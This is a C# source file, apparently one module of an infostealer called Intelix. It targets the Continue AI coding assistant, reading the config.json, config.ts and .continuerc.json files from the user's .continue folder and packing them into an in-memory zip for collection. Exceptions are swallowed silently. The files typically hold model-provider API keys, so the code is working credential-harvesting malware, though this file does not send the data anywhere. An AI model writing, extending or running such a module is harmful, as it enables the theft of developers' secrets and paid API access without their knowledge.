using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class Continue : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string continueDir = Path.Combine(userProfile, ".continue");
            if (!Directory.Exists(continueDir)) return;
            var entry = new Counter.CounterApplications { Name = "Continue" };
            string[] targetFiles = {
                Path.Combine(continueDir, "config.json"),
                Path.Combine(continueDir, "config.ts"),
                Path.Combine(continueDir, ".continuerc.json")
            };
            foreach (string file in targetFiles)
            {
                if (!File.Exists(file)) continue;
                try
                {
                    string rel = "AI-Agent\\Continue\\" + Path.GetFileName(file);
                    zip.AddFile(rel, File.ReadAllBytes(file));
                    entry.Files.Add(file + " => " + rel);
                }
                catch { }
            }
            if (entry.Files.Count > 0) counter.AI.Add(entry);
        }
    }
}
